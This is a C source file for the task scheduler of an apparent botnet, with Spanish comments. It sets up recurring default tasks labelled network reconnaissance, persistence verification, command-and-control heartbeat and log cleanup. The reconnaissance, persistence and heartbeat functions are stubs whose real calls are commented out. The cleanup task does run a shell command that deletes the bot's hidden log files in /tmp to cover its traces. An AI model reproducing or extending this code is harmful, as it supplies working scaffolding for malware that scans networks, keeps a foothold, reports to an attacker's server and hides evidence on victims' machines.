#include "../../include/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>

typedef struct scheduled_task {
    void (*function)(void);
    int interval;
    time_t last_run;
    char task_name[64];
    int task_id;
    int enabled;
    struct scheduled_task *next;
} scheduled_task_t;

scheduled_task_t *task_list = NULL;
pthread_mutex_t scheduler_lock = PTHREAD_MUTEX_INITIALIZER;
int task_counter = 0;
int scheduler_running = 0;

void init_scheduler() {
    printf("[SCHEDULER] Initializing task scheduler subsystem\n");
    printf("[SCHEDULER] Memory allocated for task structures\n");

    if (pthread_mutex_init(&scheduler_lock, NULL) != 0) {
        printf("[ERROR] Failed to initialize scheduler mutex\n");
        return;
    }

    scheduler_running = 1;
    printf("[SCHEDULER] Scheduler initialized successfully\n");
    printf("[SCHEDULER] Ready to accept scheduled tasks\n");
}

void schedule_task(void (*task)(void), int interval, const char *task_name) {
    pthread_mutex_lock(&scheduler_lock);

    scheduled_task_t *new_task = malloc(sizeof(scheduled_task_t));
    if (!new_task) {
        printf("[ERROR] Memory allocation failed for task: %s\n", task_name);
        pthread_mutex_unlock(&scheduler_lock);
        return;
    }

    new_task->function = task;
    new_task->interval = interval;
    new_task->last_run = time(NULL);
    new_task->task_id = ++task_counter;
    new_task->enabled = 1;
    strncpy(new_task->task_name, task_name, sizeof(new_task->task_name)-1);
    new_task->next = task_list;
    task_list = new_task;

    printf("[SCHEDULER] Task #%d scheduled: %s (every %d seconds)\n",
           task_counter, task_name, interval);
    printf("[SCHEDULER] Next execution: %ld\n", time(NULL) + interval);

    pthread_mutex_unlock(&scheduler_lock);
}

void run_scheduled_tasks() {
    if (!scheduler_running) return;

    time_t current_time = time(NULL);
    scheduled_task_t *current = task_list;
    int tasks_executed = 0;

    pthread_mutex_lock(&scheduler_lock);

    while (current != NULL) {
        if (current->enabled && (current_time - current->last_run >= current->interval)) {
            printf("[SCHEDULER] Executing task #%d: %s\n", current->task_id, current->task_name);

            // Ejecutar tarea (liberar mutex durante ejecución)
            pthread_mutex_unlock(&scheduler_lock);
            current->function();
            pthread_mutex_lock(&scheduler_lock);

            current->last_run = current_time;
            tasks_executed++;

            printf("[SCHEDULER] Task #%d completed successfully\n", current->task_id);
        }
        current = current->next;
    }

    pthread_mutex_unlock(&scheduler_lock);

    if (tasks_executed > 0) {
        printf("[SCHEDULER] %d tasks executed in this cycle\n", tasks_executed);
    }
}

void disable_task(int task_id) {
    pthread_mutex_lock(&scheduler_lock);

    scheduled_task_t *current = task_list;
    while (current != NULL) {
        if (current->task_id == task_id) {
            current->enabled = 0;
            printf("[SCHEDULER] Task #%d disabled: %s\n", task_id, current->task_name);
            break;
        }
        current = current->next;
    }

    pthread_mutex_unlock(&scheduler_lock);
}

void enable_task(int task_id) {
    pthread_mutex_lock(&scheduler_lock);

    scheduled_task_t *current = task_list;
    while (current != NULL) {
        if (current->task_id == task_id) {
            current->enabled = 1;
            current->last_run = time(NULL);
            printf("[SCHEDULER] Task #%d enabled: %s\n", task_id, current->task_name);
            break;
        }
        current = current->next;
    }

    pthread_mutex_unlock(&scheduler_lock);
}

void list_scheduled_tasks() {
    pthread_mutex_lock(&scheduler_lock);

    printf("[SCHEDULER] === Current Scheduled Tasks ===\n");
    scheduled_task_t *current = task_list;
    int active_count = 0;

    while (current != NULL) {
        printf("[TASK] #%d: %s | Interval: %ds | Status: %s | Last: %lds ago\n",
               current->task_id,
               current->task_name,
               current->interval,
               current->enabled ? "ACTIVE" : "DISABLED",
               time(NULL) - current->last_run);
        current = current->next;
        active_count++;
    }

    printf("[SCHEDULER] Total tasks: %d\n", active_count);
    printf("[SCHEDULER] ===============================\n");

    pthread_mutex_unlock(&scheduler_lock);
}

void cleanup_scheduler() {
    printf("[SCHEDULER] Initiating scheduler cleanup sequence\n");

    scheduler_running = 0;
    sleep(1); // Esperar a que cualquier ejecución en curso termine

    pthread_mutex_lock(&scheduler_lock);

    scheduled_task_t *current = task_list;
    int tasks_freed = 0;

    while (current != NULL) {
        scheduled_task_t *next = current->next;
        printf("[SCHEDULER] Freeing task #%d: %s\n", current->task_id, current->task_name);
        free(current);
        current = next;
        tasks_freed++;
    }

    task_list = NULL;
    pthread_mutex_unlock(&scheduler_lock);
    pthread_mutex_destroy(&scheduler_lock);

    printf("[SCHEDULER] Cleanup completed: %d tasks freed\n", tasks_freed);
    printf("[SCHEDULER] Scheduler subsystem shutdown\n");
}

// Función de ejemplo para tareas programadas
void network_scan_task() {
    printf("[TASK] Executing scheduled network reconnaissance\n");
    // start_network_scan();
}

void persistence_check_task() {
    printf("[TASK] Verifying persistence mechanisms\n");
    // verify_persistence();
}

void c2_heartbeat_task() {
    printf("[TASK] Sending heartbeat to command and control\n");
    // send_heartbeat();
}

void log_cleanup_task() {
    printf("[TASK] Cleaning up temporary log files\n");
    system("rm -f /tmp/.botnet_*.log 2>/dev/null");
}

// Inicializar con tareas por defecto
void init_default_tasks() {
    schedule_task(network_scan_task, 300, "Network Reconnaissance");
    schedule_task(persistence_check_task, 180, "Persistence Verification");
    schedule_task(c2_heartbeat_task, 60, "C2 Heartbeat");
    schedule_task(log_cleanup_task, 900, "Log Cleanup");

    printf("[SCHEDULER] Default task suite initialized\n");
}